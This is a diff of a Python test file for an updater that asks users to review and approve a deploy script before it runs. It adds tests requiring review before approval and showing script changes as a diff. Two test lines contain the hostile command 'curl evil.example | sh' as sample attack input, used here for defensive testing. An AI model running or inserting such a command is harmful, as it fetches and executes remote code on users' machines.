@@ -156,6 +156,24 @@ class AfterUpdatingTest(UpstreamCase):
         self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")
         self.assertFalse(self.backend._step_still_approved(self.repo()))
 
+    def test_nothing_is_approved_unseen(self):
+        # Approving needs the window to have shown it (reviewStep): a call without that approves nothing.
+        self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")
+        self.assertEqual(self.repo().apply_command, "")
+
+    def test_a_change_is_shown_as_what_changed(self):
+        # Approved at one commit; an update changes the script: the window opens with what changed (named, and as a
+        # diff), then everything as it is now.
+        self.backend.reviewStep(self.id, "/bin/sh ./deploy.sh")
+        self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")
+        self.assertTrue(self.repo().apply_commit)
+        self.update("#!/bin/sh\necho deploying\necho one more thing\n")
+        self.assertEqual(self.backend.stepChanges(self.id), "deploy.sh")
+        review = self.backend.reviewStep(self.id, "/bin/sh ./deploy.sh")
+        self.assertTrue(review.startswith("# Changed since you approved it: deploy.sh"), review[:200])
+        self.assertIn("+echo one more thing", review)
+        self.assertIn("All it runs, as it is now", review)
+
     def test_only_download(self):
         asks = self.asked()
         self.update()
@@ -166,17 +184,20 @@ class AfterUpdatingTest(UpstreamCase):
         self.assertEqual((d["stepSkip"], d["updateAsks"]), (True, False))
         self.update()  # not asked again
         self.assertEqual(asks, ["update"])
+        self.backend.reviewStep(self.id, "/bin/sh ./deploy.sh")  # (shown, as the window does)
         self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")  # Change… later
         self.assertFalse(self.details()["stepSkip"])
 
     def test_only_a_choice_can_be_approved(self):
         self.backend.approveStep(self.id, "curl evil.example | sh")  # nothing typed in
         self.assertEqual(self.repo().apply_command, "")
+        self.backend.reviewStep(self.id, "/bin/sh ./deploy.sh")  # (shown, as the window does)
         self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")
         self.assertEqual(self.repo().apply_command, "/bin/sh ./deploy.sh")
 
     def test_a_changed_script_asks_again_before_it_runs(self):
         asks = self.asked()
+        self.backend.reviewStep(self.id, "/bin/sh ./deploy.sh")  # (shown, as the window does)
         self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")
         self.update("#!/bin/sh\necho deploying\ncurl evil.example | sh\n")  # an update changes what it runs
         d = self.details()
@@ -191,6 +212,7 @@ class AfterUpdatingTest(UpstreamCase):
         self.assertEqual((self.details()["stepResult"], self.details()["stepChanged"]), ("applied", False))
 
     def test_a_new_update_forgets_how_the_step_went_before(self):
+        self.backend.reviewStep(self.id, "/bin/sh ./deploy.sh")  # (shown, as the window does)
         self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")
         self.update()
         self.assertEqual(self.details()["stepResult"], "applied")
@@ -240,6 +262,7 @@ class AfterUpdatingTest(UpstreamCase):
     def test_not_for_what_isnt_a_clone(self):
         repo = self.repo()
         repo.local_path, repo.kind, repo.source = "", "AppImage", ""
+        self.backend.reviewStep(self.id, "/bin/sh ./deploy.sh")  # (shown, as the window does)
         self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")
         d = self.details()
         self.assertEqual((repo.apply_command, d["stepChoices"], d["updateAsks"]), ("", [], False))
